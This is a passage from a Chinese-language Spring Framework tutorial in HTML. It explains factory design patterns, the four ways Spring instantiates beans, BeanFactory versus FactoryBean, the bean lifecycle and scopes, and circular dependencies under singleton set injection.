punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> weapon<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>简单工厂模式的优点：<br>●客户端程序不需要关心对象的创建细节，需要哪个对象时，只需要向工厂索要即可，初步实现了责任的分离。客户端只负责“消费”，工厂负责“生产”。生产和消费分离。<br>简单工厂模式的缺点：<br>●<strong>缺点1</strong>：工厂类集中了所有产品的创造逻辑，形成一个无所不知的全能类，有人把它叫做上帝类。显然工厂类非常关键，不能出问题，一旦出问题，整个系统瘫痪。<br>●<strong>缺点2</strong>：不符合OCP开闭原则，在进行系统扩展时，<strong>需要修改工厂类</strong>。<br>Spring中的BeanFactory就使用了简单工厂模式。</p><h4 id="6-3-工厂方法模式"><a href="#6-3-工厂方法模式" class="headerlink" title="6.3 工厂方法模式"></a>6.3 工厂方法模式</h4><p>工厂方法模式既保留了简单工厂模式的优点，同时又解决了简单工厂模式的缺点。<br>工厂方法模式的角色包括：<br>●抽象工厂角色<br>●具体工厂角色<br>●抽象产品角色<br>●具体产品角色</p><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        WeaponFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GunFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Weapon weapon <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weapon<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        WeaponFactory factory1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FighterFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Weapon weapon1 <span class="token operator">=</span> factory1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        weapon1<span class="token punctuation">.</span><span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>如果想扩展一个新的产品，只要新增一个产品类，再新增一个该产品对应的工厂即可</p><p>我们可以看到在进行功能扩展的时候，不需要修改之前的源代码，显然工厂方法模式符合OCP原则。<br>工厂方法模式的优点：<br>●一个调用者想创建一个对象，只要知道其名称就可以了。<br>●扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。<br>●屏蔽产品的具体实现，调用者只关心产品的接口。<br>工厂方法模式的缺点：<br>●<strong>每次增加</strong>一个<strong>产品</strong>时，都需要<strong>增加一个具体类和对象实现工厂</strong>，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。</p><h4 id="6-4-抽象工厂模式（了解）"><a href="#6-4-抽象工厂模式（了解）" class="headerlink" title="6.4 抽象工厂模式（了解）"></a>6.4 抽象工厂模式（了解）</h4><p>抽象工厂模式相对于工厂方法模式来说，就是工厂方法模式是针对一个产品系列的，而抽象工厂模式是针对多个产品系列的，即工厂方法模式是一个产品系列一个工厂类，而抽象工厂模式是多个产品系列一个工厂类。<br>抽象工厂模式特点：抽象工厂模式是所有形态的工厂模式中最为抽象和最具一般性的一种形态。抽象工厂模式是指当有多个抽象角色时，使用的一种工厂模式。抽象工厂模式可以向客户端提供一个接口，使客户端在不必指定产品的具体的情况下，创建多个产品族中的产品对象。它有多个抽象产品类，每个抽象产品类可以派生出多个具体产品类，一个抽象工厂类，可以派生出多个具体工厂类，每个具体工厂类可以创建多个具体产品类的实例。每一个模式都是针对一定问题的解决方案，工厂方法模式针对的是一个产品等级结构；而抽象工厂模式针对的是多个产品等级结果。</p><h3 id="七、Bean的实例化方式"><a href="#七、Bean的实例化方式" class="headerlink" title="七、Bean的实例化方式"></a>七、Bean的实例化方式</h3><p>Spring为Bean提供了多种实例化方式，通常包括4种方式。（也就是说在Spring中为Bean对象的创建准备了多种方案，目的是：更加灵活）<br>●第一种：通过构造方法实例化<br>●第二种：通过简单工厂模式实例化<br>●第三种：通过factory-bean实例化<br>●第四种：通过FactoryBean接口实例化</p><h4 id="7-1-通过构造方法实例化"><a href="#7-1-通过构造方法实例化" class="headerlink" title="7.1 通过构造方法实例化"></a>7.1 通过构造方法实例化</h4><p>我们之前一直使用的就是这种方式。默认情况下，会调用Bean的无参数构造方法。</p><h4 id="7-2-通过简单工厂模式实例化"><a href="#7-2-通过简单工厂模式实例化" class="headerlink" title="7.2 通过简单工厂模式实例化"></a>7.2 通过简单工厂模式实例化</h4><p>指定方法初始化</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">VipFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Vip <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Vip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>vipBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.VipFactory<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><pre class=" language-java"><code class="language-java">    ApplicationContext applicationContext <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"spring.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Vip vip <span class="token operator">=</span> applicationContext<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"vipBean"</span><span class="token punctuation">,</span> Vip<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//实例化</span>Class<span class="token punctuation">.</span><span class="token function">forname</span><span class="token punctuation">(</span><span class="token string">"com.powernode.spring6.bean.VipFactory"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethed</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//所以:VipFactory没有被实例化。</span></code></pre><h4 id="7-3-通过factory-bean实例化"><a href="#7-3-通过factory-bean实例化" class="headerlink" title="7.3 通过factory-bean实例化"></a>7.3 通过factory-bean实例化</h4><p>这种方式本质上是：通过工厂方法模式进行实例化。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Order</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">OrderFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Order <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderFactory<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.OrderFactory<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderBean<span class="token punctuation">"</span></span> <span class="token attr-name">factory-bean</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>orderFactory<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--Spring提供的实例化的第三种方式：通过工厂方法模式，你需要在配置文件中告诉Spring框架,调用哪个对象的那个方法获取bean--></span><span class="token comment" spellcheck="true">&lt;!--实验实例化时机：    配置文件配上这两个&lt;bean/>标签后    在Spring上下文初始化时，Gun类和GunFactory类的无参构造都执行了，也是在context.getBean("gun", Gun.class)之前，      底层先实例化了GunFactory类，然后调用了其中指定的那个实例方法，获取到了Gun类的Bean。        实例化时机：Spring上下文初始化（创建Spring容器对象的时候）。 --></span><span class="token comment" spellcheck="true">&lt;!--跟第二种方式不同，调用哪个"对象"的哪个方法，我们得先有这个"对象"才可以，所以得先实例化（创建）这个"对象"--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gunFactory<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.bjpowernode.bean.GunFactory<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token comment" spellcheck="true">&lt;!--下面配置很关键，factory-bean 属性：告诉Spring框架调用哪个对象。factory-method 属性：告诉Spring框架调用该对象的哪个方法 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gun<span class="token punctuation">"</span></span> <span class="token attr-name">factory-bean</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>gunFactory<span class="token punctuation">"</span></span> <span class="token attr-name">factory-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>getGun<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><h4 id="7-4-通过FactoryBean接口实例化"><a href="#7-4-通过FactoryBean接口实例化" class="headerlink" title="7.4 通过FactoryBean接口实例化"></a>7.4 通过FactoryBean接口实例化</h4><p>以上的第三种方式中，factory-bean是我们自定义的，factory-method也是我们自己定义的。<br>在Spring中，当你编写的类直接实现FactoryBean接口之后，factory-bean不需要指定了，factory-method也不需要指定了。<br>factory-bean会自动指向实现FactoryBean接口的类，factory-method会自动指向getObject()方法。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">PersonFactoryBean</span> <span class="token keyword">implements</span> <span class="token class-name">FactoryBean</span><span class="token operator">&lt;</span>Person<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Person <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">></span> <span class="token function">getObjectType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isSingleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// true表示单例</span>        <span class="token comment" spellcheck="true">// false表示原型</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--Spring提供的实例化的第四种方式：通过FactoryBean接口来实现--></span><span class="token comment" spellcheck="true">&lt;!--这种方式实际上就是对第三种方式的简化--></span><span class="token comment" spellcheck="true">&lt;!--classs属性直接是工厂Bean的全限定类名，就是直接创建（获取）这个FactoryBean工厂Bean，返回的就是一个"普通Bean"--></span><span class="token comment" spellcheck="true">&lt;!--由于你编写的类实现了FactoryBean接口，所以这类是一个特殊的类，不用再手动指定factory-bean,factory-method--></span><span class="token comment" spellcheck="true">&lt;!--通过一个特殊的Bean 工厂Bean。来返回一个普通的Bean Person对象--></span><span class="token comment" spellcheck="true">&lt;!--通过FactoryBean这个工厂Bean主要是想对普通的Bean进行加工处理--></span><span class="token comment" spellcheck="true">&lt;!--    实验实例化时机：    在Spring上下文初始化时，只有PersonFactoryBean的无参构造执行了，因为下面这个&lt;bean/>的配置其实就是第一种实例化方式    所以在Spring上下文初始化时，PersonFactoryBean这个工厂Bean就被实例化了，但在调用context.getBean("personBean", Person.class)时，    person的无参构造执行了，返回是一个Person的Bean。    按道理来说，既然都是第一种实例化方式了，那返回的不应该就是一个PersonFactoryBean类的工厂Bean吗？是因为这个Bean是一个实现了FactoryBean接口的特殊的Bean，    所以在调用context.getBean("personBean", Person.class)时，底层会调用这个工厂Bean的getObject()实例方法，返回的就是我们自己在getObject()方法里    可以经过加工处理的一个"普通Bean"Person的Bean。        实例化时机：调用context.getBean()的时候。--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>personBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.bjpowernode.bean.PersonFactoryBean<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>FactoryBean在Spring中是一个接口。被称为“<strong>工厂Bean</strong>”。“工厂Bean”是一种特殊的Bean。所有的“工厂Bean”都是用来协助Spring框架来创建其他Bean对象的。</p><h4 id="7-5-BeanFactory和FactoryBean的区别"><a href="#7-5-BeanFactory和FactoryBean的区别" class="headerlink" title="7.5 BeanFactory和FactoryBean的区别"></a>7.5 BeanFactory和FactoryBean的区别</h4><h4 id="7-5-1-BeanFactory"><a href="#7-5-1-BeanFactory" class="headerlink" title="7.5.1 BeanFactory"></a>7.5.1 BeanFactory</h4><p>Spring IoC容器的顶级对象，BeanFactory被翻译为“Bean工厂”，在Spring的IoC容器中，“Bean工厂”负责创建Bean对象。<br>BeanFactory是工厂。</p><h4 id="7-5-2-FactoryBean"><a href="#7-5-2-FactoryBean" class="headerlink" title="7.5.2 FactoryBean"></a>7.5.2 FactoryBean</h4><p>FactoryBean：它是一个Bean，是一个能够辅助Spring实例化其它Bean对象的一个Bean。<br>在Spring中，Bean可以分为两类：<br>●第一类：普通Bean<br>●第二类：工厂Bean（记住：工厂Bean也是一种Bean，只不过这种Bean比较特殊，它可以辅助Spring实例化其它Bean对象。）</p><h4 id="7-6-注入自定义Date"><a href="#7-6-注入自定义Date" class="headerlink" title="7.6 注入自定义Date"></a>7.6 注入自定义Date</h4><p>我们前面说过，java.util.Date在Spring中被当做简单类型，简单类型在注入的时候可以直接使用value属性或value标签来完成。但我们之前已经测试过了，对于Date类型来说，采用value属性或value标签赋值的时候，对日期字符串的格式要求非常严格，必须是这种格式的：Mon Oct 10 14:30:26 CST 2022。其他格式是不会被识别的。</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>studentBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.Student<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>birth<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Mon Oct 10 14:30:26 CST 2002<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><h3 id="八、Bean的生命周期"><a href="#八、Bean的生命周期" class="headerlink" title="八、Bean的生命周期"></a>八、Bean的生命周期</h3><h4 id="8-1-什么是Bean的生命周期"><a href="#8-1-什么是Bean的生命周期" class="headerlink" title="8.1 什么是Bean的生命周期"></a>8.1 什么是Bean的生命周期</h4><p>Spring其实就是一个管理Bean对象的工厂。它负责对象的创建，对象的销毁等。<br>所谓的生命周期就是：对象从创建开始到最终销毁的整个过程。<br>什么时候创建Bean对象？<br>创建Bean对象的前后会调用什么方法？<br>Bean对象什么时候销毁？<br>Bean对象的销毁前后调用什么方法？</p><h4 id="8-2-为什么要知道Bean的生命周期"><a href="#8-2-为什么要知道Bean的生命周期" class="headerlink" title="8.2 为什么要知道Bean的生命周期"></a>8.2 为什么要知道Bean的生命周期</h4><p>其实生命周期的本质是：在哪个时间节点上调用了哪个类的哪个方法。<br>我们需要充分的了解在这个生命线上，都有哪些特殊的时间节点。<br>只有我们知道了特殊的时间节点都在哪，到时我们才可以确定代码写到哪。<br>我们可能需要在某个特殊的时间点上执行一段特定的代码，这段代码就可以放到这个节点上。当生命线走到这里的时候，自然会被调用。</p><h4 id="8-3-Bean的生命周期之5步"><a href="#8-3-Bean的生命周期之5步" class="headerlink" title="8.3 Bean的生命周期之5步"></a>8.3 Bean的生命周期之5步</h4><p>Bean生命周期的管理，可以参考Spring的源码：AbstractAutowireCapableBeanFactory类的doCreateBean()方法。<br>Bean生命周期可以粗略的划分为五大步：<br>●第一步：实例化Bean<br>●第二步：Bean属性赋值<br>●第三步：初始化Bean<br>●第四步：使用Bean<br>●第五步：销毁Bean</p><pre class=" language-xml"><code class="language-xml">    <span class="token comment" spellcheck="true">&lt;!--    init-method属性指定初始化方法。    destroy-method属性指定销毁方法。    --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>userBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.User<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>initBean<span class="token punctuation">"</span></span> <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>destroyBean<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zhangsan<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span></code></pre><p>需要注意的：<br>●第一：只有正常关闭spring容器，bean的销毁方法才会被调用。<br>●第二：ClassPathXmlApplicationContext类才有close()方法。<br>●第三：配置文件中的init-method指定初始化方法。destroy-method指定销毁方法。</p><h4 id="8-4-Bean生命周期之7步"><a href="#8-4-Bean生命周期之7步" class="headerlink" title="8.4 Bean生命周期之7步"></a>8.4 Bean生命周期之7步</h4><p>在以上的5步中，第3步是初始化Bean，如果你还想在初始化前和初始化后添加代码，可以加入“Bean后处理器”。</p><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--配置Bean后处理器。这个后处理器将作用于当前配置文件中所有的bean。--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.LogBeanPostProcessor<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><p>一定要注意：在spring.xml文件中配置的Bean后处理器将作用于当前配置文件中所有的Bean。</p><p>●第一步：实例化Bean<br>●第二步：Bean属性赋值</p><p>​        <strong>Bean后处理器的before方法执行即将开始初始化</strong></p><p>●第三步：初始化Bean</p><p>​        <strong>Bean后处理器的after方法执行，已完成初始化</strong>        </p><p>●第四步：使用Bean<br>●第五步：销毁Bean</p><h4 id="8-5-Bean生命周期之10步"><a href="#8-5-Bean生命周期之10步" class="headerlink" title="8.5 Bean生命周期之10步"></a>8.5 Bean生命周期之10步</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/21376908/1665394697870-15de433a-8d50-4b31-9b75-b2ca7090c1c6.png?x-oss-process=image%2Fwatermark%2Ctype_d3F5LW1pY3JvaGVp%2Csize_12%2Ctext_5Yqo5Yqb6IqC54K5%2Ccolor_FFFFFF%2Cshadow_50%2Ct_80%2Cg_se%2Cx_10%2Cy_10" alt="image.png"></p><p>Aware相关的接口包括：BeanNameAware、BeanClassLoaderAware、BeanFactoryAware<br>●当Bean实现了BeanNameAware，Spring会将Bean的名字传递给Bean。<br>●当Bean实现了BeanClassLoaderAware，Spring会将加载该Bean的类加载器传递给Bean。<br>●当Bean实现了BeanFactoryAware，Spring会将Bean工厂对象传递给Bean。<br>测试以上10步，可以让User类实现5个接口，并实现所有方法：<br>●BeanNameAware<br>●BeanClassLoaderAware<br>●BeanFactoryAware<br>●InitializingBean<br>●DisposableBean</p><p>通过测试可以看出来：<br>●InitializingBean的方法早于init-method的执行。<br>●DisposableBean的方法早于destroy-method的执行。<br>对于SpringBean的生命周期，掌握之前的7步即可。够用。</p><h4 id="8-6-Bean的作用域不同，管理方式不同"><a href="#8-6-Bean的作用域不同，管理方式不同" class="headerlink" title="8.6 Bean的作用域不同，管理方式不同"></a>8.6 Bean的作用域不同，管理方式不同</h4><p>Spring 根据Bean的作用域来选择管理方式。<br>●对于singleton作用域的Bean，Spring 能够精确地知道该Bean何时被创建，何时初始化完成，以及何时被销毁；<br>●而对于 <strong>prototype</strong> 作用域的 Bean，Spring <strong>只负责创建</strong>，当容器创建了 Bean 的<strong>实例后</strong>，Bean 的实例就交给客户端代码管理，Spring 容器将<strong>不再跟踪其生命周期</strong>。（只执行了前8步，第9和10都没有执行。）</p><h4 id="8-7-自己new的对象如何让Spring管理"><a href="#8-7-自己new的对象如何让Spring管理" class="headerlink" title="8.7 自己new的对象如何让Spring管理"></a>8.7 自己new的对象如何让Spring管理</h4><pre class=" language-java"><code class="language-java">        <span class="token comment" spellcheck="true">// 创建 默认可列表BeanFactory 对象</span>        DefaultListableBeanFactory factory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DefaultListableBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 注册Bean</span>        factory<span class="token punctuation">.</span><span class="token function">registerSingleton</span><span class="token punctuation">(</span><span class="token string">"userBean"</span><span class="token punctuation">,</span> user<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 从spring容器中获取bean</span>        User userBean <span class="token operator">=</span> factory<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"userBean"</span><span class="token punctuation">,</span> User<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>userBean<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="九、Bean的循环依赖问题"><a href="#九、Bean的循环依赖问题" class="headerlink" title="九、Bean的循环依赖问题"></a>九、Bean的循环依赖问题</h3><h4 id="9-1-什么是Bean的循环依赖"><a href="#9-1-什么是Bean的循环依赖" class="headerlink" title="9.1 什么是Bean的循环依赖"></a>9.1 什么是Bean的循环依赖</h4><p>A对象中有B属性。B对象中有A属性。这就是循环依赖。我依赖你，你也依赖我。<br>比如：丈夫类Husband，妻子类Wife。Husband中有Wife的引用。Wife中有Husband的引用。</p><h4 id="9-2-singleton下的set注入产生的循环依赖"><a href="#9-2-singleton下的set注入产生的循环依赖" class="headerlink" title="9.2 singleton下的set注入产生的循环依赖"></a>9.2 singleton下的set注入产生的循环依赖</h4><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>husbandBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.Husband<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>singleton<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>张三<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wife<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wifeBean<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wifeBean<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.bean.Wife<span class="token punctuation">"</span></span> <span class="token attr-name">scope</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>singleton<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>小花<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>husband<span class="token punctuation">"</span></span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>husbandBean<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>在singleton + set注入的情况下，循环依赖是没有问题的。Spring可以解决这个问题。（根据bean的生命周期可以知道，spring容器当中的<strong>bean是先被实例化的 实例化之后才是属性初始化</strong>，所以当husband需要给wife属性赋值的时候 wife这个bean已经<strong>提前曝光</strong>了而且还是单例的，所以可以解决循环依赖问题）</p><h4 id="9-3-prototype下的set注入产生的循环依赖"><a href="#9-3-prototype下的set注入产生的循环依赖" class="headerlink" title="9.3 